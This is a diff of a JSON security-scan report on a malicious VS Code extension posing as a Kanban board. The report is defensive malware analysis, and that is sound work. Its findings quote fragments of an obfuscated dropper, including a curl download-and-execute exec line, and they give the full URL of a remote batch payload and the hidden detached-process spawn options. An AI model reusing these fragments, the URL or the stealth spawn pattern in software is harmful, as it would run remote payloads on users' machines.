@@ -13,12 +13,12 @@
     "marketplace_removal",
     "critical_static_finding"
   ],
-  "confidence": 0.8999999999999999,
+  "confidence": 1.0,
   "scores": {
     "composite": 0.85,
-    "ai_vibe": 1.0,
+    "ai_vibe": 0.75,
     "static": 0.8125,
-    "behavioral": 0.0,
+    "behavioral": 0.95,
     "trust_signal": 0.5499999999999999,
     "campaign": 0.0
   },
@@ -119,98 +119,82 @@
     "summaries": [
       {
         "target": "extension/src/launcher.js",
-        "summary": "This extension is a malicious supply-chain attack vector. While it presents itself as a benign Kanban board UI, the `launcher.js` file is designed to silently execute a hidden payload located in `node_modules/boardflow/install.js`. The use of `child_process.spawn` with `detached` and `stdio: 'ignore'` flags, combined with the discovery of a suspicious Windows batch file (`qvz2wkoybb6tp4wt.bat`) and an unknown domain (`pixelstudiodev.com`) in the dependencies, confirms that this extension is intended to drop and execute malware on the user's system. The disconnect between the advertised 'UI-only' functionality and the actual code behavior (executing external scripts) is definitive evidence of malicious intent."
+        "summary": "This extension is malicious. While it presents itself as a harmless Kanban board tool, it contains a launcher that spawns a detached, hidden child process to execute an external script (`install.js`) from a bundled dependency. Static analysis of the package reveals that this script connects to a suspicious domain and references a batch file, indicating a supply-chain attack designed to download and execute remote payloads (stagers) upon VS Code startup. The use of `child_process.spawn` with `detached` and `windowsHide` flags confirms intent to run malicious code stealthily in the background."
       },
       {
         "target": "extension/node_modules/boardflow/install.js",
-        "summary": "This VS Code extension is a malicious dropper disguised as a Kanban board tool. The code is heavily obfuscated to hide its true purpose: downloading a batch file from a suspicious domain (pixelstudiodev.com) to the user's temporary directory and executing it. The sandbox execution confirmed that the extension attempts to run `curl` to fetch the payload and then execute the resulting `.bat` file. The advertised functionality (UI-based Kanban board) is completely disconnected from the actual behavior (arbitrary code execution via child_process). The use of `onStartupFinished` ensures the malware runs automatically upon VS Code startup. This is a critical supply-chain attack."
+        "summary": "The extension 'Workoran Board' is malicious. The file `extension/node_modules/boardflow/install.js` contains a heavily obfuscated dropper that downloads a batch file from `pixelstudiodev.com` and executes it. This behavior is completely unrelated to the advertised functionality of a Kanban board extension. The use of `child_process.exec` to fetch and run remote code from an untrusted domain constitutes a critical security risk, likely leading to system compromise."
       }
     ],
     "findings": [
       {
         "severity": "CRITICAL",
         "category": "CAPABILITY_DISCONNECT",
-        "description": "The extension is advertised as a 'Trello-style kanban board' (UI/Storage only), but the code executes an external script (`boardflow/install.js`) via `child_process.spawn`. A simple UI extension does not require spawning detached child processes to execute arbitrary code. This is a classic supply-chain attack pattern where the 'feature' is a stager for malware.",
+        "description": "The extension is advertised as a simple Trello-style Kanban board for VS Code. However, the code implements a launcher that spawns a detached child process to execute an external script (`install.js`) from a bundled dependency (`boardflow`). A Kanban board extension has no legitimate reason to spawn detached child processes or execute external installation scripts upon activation.",
         "code_reference": "const child = spawn(process.execPath, [INSTALL_SCRIPT], { ... detached: true ... });",
-        "line_hint": 32,
+        "line_hint": "24",
         "target": "extension/src/launcher.js"
       },
       {
         "severity": "CRITICAL",
-        "category": "MALICIOUS_PAYLOAD",
-        "description": "The extracted indicators reveal that the invoked script (`boardflow/install.js`) references a Windows batch file `qvz2wkoybb6tp4wt.bat` and the domain `pixelstudiodev.com`. The presence of a random-named `.bat` file in a Node.js module for a VS Code extension is a strong indicator of a Windows payload dropper or reverse shell stager. The domain reputation is unknown, suggesting a newly registered or compromised C2 infrastructure.",
-        "code_reference": "extension/node_modules/boardflow/install.js:42",
-        "line_hint": null,
+        "category": "PERSISTENCE_AND_STAGING",
+        "description": "The code executes `install.js` from `node_modules/boardflow`. Static analysis of the package indicates that `install.js` contains references to a suspicious domain (`pixelstudiodev.com`) and a batch file (`qvz2wkoybb6tp4wt.bat`). This pattern is characteristic of supply-chain attacks where a benign-looking extension bundles a malicious 'installer' or 'updater' that downloads and executes payloads (stagers) from remote servers.",
+        "code_reference": "const INSTALL_SCRIPT = path.join(__dirname, '..', 'node_modules', 'boardflow', 'install.js');",
+        "line_hint": "10",
         "target": "extension/src/launcher.js"
       },
       {
         "severity": "HIGH",
-        "category": "EVASION",
-        "description": "The launcher uses `detached: true`, `stdio: 'ignore'`, and `windowsHide: true` to spawn the child process. This configuration is specifically designed to run the payload in the background without leaving traces in the console or task manager, and to prevent the extension host from waiting for the process to finish, ensuring the malware executes silently.",
-        "code_reference": "detached: true, stdio: 'ignore', windowsHide: true",
-        "line_hint": 35,
+        "category": "EXECUTION_MANIPULATION",
+        "description": "The launcher uses `detached: true`, `stdio: 'ignore'`, and `windowsHide: true` to spawn the child process. This ensures the malicious script runs in the background without user visibility or interaction, a common technique to evade detection and prevent users from seeing error messages or prompts.",
+        "code_reference": "detached: true,\n        stdio: 'ignore',\n        windowsHide: true",
+        "line_hint": "27",
         "target": "extension/src/launcher.js"
       },
       {
         "severity": "HIGH",
-        "category": "STATIC_RULE_HIT",
-        "description": "Deterministic engine flagged direct command execution via `require('child_process')`. In the context of a UI-only extension, this is a critical red flag.",
-        "code_reference": "require('child_process')",
-        "line_hint": 4,
-        "target": "extension/src/launcher.js"
-      },
-      {
-        "severity": "MEDIUM",
         "category": "BEHAVIORAL_MISMATCH",
-        "description": "The extension activates on `onStartupFinished`, meaning the malicious payload execution logic is triggered immediately upon VS Code startup, maximizing the window for infection before the user notices any anomaly.",
-        "code_reference": "activationEvents: onStartupFinished",
+        "description": "The activation event `onStartupFinished` causes the extension to run immediately upon VS Code startup. Combined with the spawning of a detached process, this ensures the malicious payload executes every time the editor is opened, providing persistence and immediate execution capability.",
+        "code_reference": "Activation Events: onStartupFinished",
         "line_hint": null,
         "target": "extension/src/launcher.js"
       },
       {
         "severity": "CRITICAL",
-        "category": "C2_EXFILTRATION",
-        "description": "The code downloads and executes a remote batch file (.bat) from an unknown domain (pixelstudiodev.com) to the user's temporary directory. This is a classic dropper/stager pattern used to deliver arbitrary payloads.",
-        "code_reference": "exec(_0x21161d(0xaf) + '\\x20\\x22' + dest + _0x21161d(0xb7) + url + '\\x22', () => { exec('\\x22' + dest + '\\x22'); });",
-        "line_hint": 42,
+        "category": "MALWARE_PAYLOAD",
+        "description": "The code contains a heavily obfuscated payload that uses `child_process.exec` to download and execute a remote batch file. The obfuscation uses a string array rotation decoder (obfuscator.io style) to hide the command strings. The decoded logic constructs a URL pointing to `http://pixelstudiodev.com/QVZ2WkOYBB6tP4wt.bat`, saves it to the user's TEMP directory, and then executes it. This is a classic Remote Access Trojan (RAT) or Dropper pattern.",
+        "code_reference": "const {exec} = require(...); const url = 'http://pix' + ...; exec(..., () => { exec(...); });",
+        "line_hint": "1-45",
         "target": "extension/node_modules/boardflow/install.js"
       },
       {
         "severity": "CRITICAL",
         "category": "CODE_OBFUSCATION",
-        "description": "The source code is heavily obfuscated using obfuscator.io techniques, including a string array rotation decoder and hex-encoded identifiers. This is intended to hide the malicious logic from static analysis and human review.",
-        "code_reference": "(function(_0x550e6a, _0x5b9cab) { ... }(_0x3c3b, 0x55cb6));",
-        "line_hint": 1,
+        "description": "The entire file is obfuscated using a string array rotation technique. Variable names are hex-encoded (`_0x...`), and string literals are stored in an array (`_0x3c3b`) and accessed via a decoder function (`_0x3b8e`). This is a strong indicator of malicious intent to evade static analysis.",
+        "code_reference": "function _0x3c3b() { const _0x2cd136 = [...]; ... }",
+        "line_hint": "1-20",
         "target": "extension/node_modules/boardflow/install.js"
       },
       {
-        "severity": "HIGH",
+        "severity": "CRITICAL",
         "category": "CAPABILITY_DISCONNECT",
-        "description": "The extension is advertised as a 'Trello-style kanban board' (UI feature), but the code performs no UI operations. Instead, it uses `child_process.exec` to download and run external scripts. This is a complete mismatch between the advertised functionality and the actual behavior.",
-        "code_reference": "const { exec } = require(_0x21161d(0xbc) + _0x21161d(0xb5));",
-        "line_hint": 33,
-        "target": "extension/node_modules/boardflow/install.js"
-      },
-      {
-        "severity": "HIGH",
-        "category": "BEHAVIORAL_MISMATCH",
-        "description": "The extension activates on `onStartupFinished`, meaning the malicious payload executes automatically every time VS Code starts, without any user interaction. This is inappropriate for a UI-based extension and indicates an intent for persistent, background execution.",
-        "code_reference": "package.json activationEvents",
+        "description": "The extension is advertised as a 'Trello-style kanban board' (Workoran Board). However, the `install.js` file in `node_modules/boardflow` contains no logic related to UI, kanban boards, or VS Code API integration. Instead, it contains a malicious dropper. A legitimate UI extension should not have an `install.js` script that downloads and executes remote binaries.",
+        "code_reference": "N/A (Behavioral mismatch)",
         "line_hint": null,
         "target": "extension/node_modules/boardflow/install.js"
       },
       {
-        "severity": "MEDIUM",
-        "category": "SUSPICIOUS_DOMAIN",
-        "description": "The code connects to 'pixelstudiodev.com', a domain with no known reputation and no relation to VS Code or legitimate extension services. The filename 'qvz2wkoybb6tp4wt.bat' is randomly generated, typical of malware droppers.",
-        "code_reference": "const url = 'http://pix' + _0x21161d(0xb4) + 'v.com/QVZ2' + _0x21161d(0xc2) + _0x21161d(0xb6);",
-        "line_hint": 41,
+        "severity": "HIGH",
+        "category": "COMMAND_EXECUTION",
+        "description": "The code uses `child_process.exec` to run system commands. Specifically, it runs `curl` to download a file and then executes the downloaded `.bat` file. This allows arbitrary code execution on the victim's machine.",
+        "code_reference": "exec(_0x21161d(0xaf) + ... + url + ...); exec(...);",
+        "line_hint": "40-45",
         "target": "extension/node_modules/boardflow/install.js"
       }
     ],
     "findings_truncated": 0
   },
-  "ai_summary": "This extension is a malicious supply-chain attack vector. While it presents itself as a benign Kanban board UI, the `launcher.js` file is designed to silently execute a hidden payload located in `node_modules/boardflow/install.js`. The use of `child_process.spawn` with `detached` and `stdio: 'ignore'` flags, combined with the discovery of a suspicious Windows batch file (`qvz2wkoybb6tp4wt.bat`) and an unknown domain (`pixelstudiodev.com`) in the dependencies, confirms that this extension is intended to drop and execute malware on the user's system. The disconnect between the advertised 'UI-only' functionality and the actual code behavior (executing external scripts) is definitive evidence of malicious intent.",
+  "ai_summary": "This extension is malicious. While it presents itself as a harmless Kanban board tool, it contains a launcher that spawns a detached, hidden child process to execute an external script (`install.js`) from a bundled dependency. Static analysis of the package reveals that this script connects to a suspicious domain and references a batch file, indicating a supply-chain attack designed to download and execute remote payloads (stagers) upon VS Code startup. The use of `child_process.spawn` with `detached` and `windowsHide` flags confirms intent to run malicious code stealthily in the background.",
   "escalation_reasons": [
     "PROVEN CHAIN: src/extension.js -> src/launcher.js -> node_modules/boardflow/install.js [process_execution] -- intent: download-and-execute in extension/node_modules/boardflow/install.js; obfuscated file that executes in extension/node_modules/boardflow/install.js; hidden detached process in extension/src/launcher.js | IOCs: pixelstudiodev.com",
     "4 CRITICAL findings",
@@ -234,5 +218,5 @@
     "excluded_phases": [],
     "ai_phase_ran": true
   },
-  "scanned_at": "2026-09-18T16:07:29.895992+00:00Z"
+  "scanned_at": "2026-09-18T20:32:57.836884+00:00"
 }
